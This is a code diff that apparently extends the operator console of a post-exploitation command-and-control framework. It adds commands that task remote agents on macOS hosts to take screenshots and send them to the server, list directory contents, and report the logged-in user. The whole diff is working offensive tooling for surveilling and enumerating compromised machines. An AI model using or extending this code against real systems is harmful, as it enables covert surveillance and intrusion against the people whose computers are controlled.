@@ -2522,6 +2522,40 @@ class PythonAgentMenu(cmd.Cmd):
         else:
             self.mainMenu.modules.search_modules(searchTerm)
 
+    def do_sc(self, line):
+        "Use pyobjc and Foundation libraries to take a screenshot, and save the image to the server"
+
+        if self.mainMenu.modules.modules['python/collection/osx/native_screenshot']:
+            module = self.mainMenu.modules.modules['python/collection/osx/native_screenshot']
+            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)
+            #execute screenshot module
+            module_menu = ModuleMenu(self.mainMenu, 'python/collection/osx/native_screenshot')
+            module_menu.do_execute("")
+        else:
+            print helpers.color("[!] python/collection/osx/screenshot module not loaded")
+
+    def do_ls(self, line):
+        "List directory contents at the specified path"
+        #http://stackoverflow.com/questions/17809386/how-to-convert-a-stat-output-to-a-unix-permissions-string
+        if self.mainMenu.modules.modules['python/management/osx/ls']:
+            module = self.mainMenu.modules.modules['python/management/osx/ls']
+            if line.strip() != '':
+                module.options['Path']['Value'] = line.strip()
+
+            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)
+            module_menu = ModuleMenu(self.mainMenu, 'python/management/osx/ls')
+            module_menu.do_execute("")
+
+        else:
+            print helpers.color("[!] python/management/osx/ls module not loaded")
+
+    def do_whoami(self, line):
+        "Print the currently logged in user"
+
+        command = "from AppKit import NSUserName; print str(NSUserName())"
+        self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", command)
+        msg = "Tasked agent to print currently logged on user"
+        self.mainMenu.agents.save_agent_log(self.sessionID, msg)
 
     def do_creds(self, line):
         "Display/return credentials from the database."
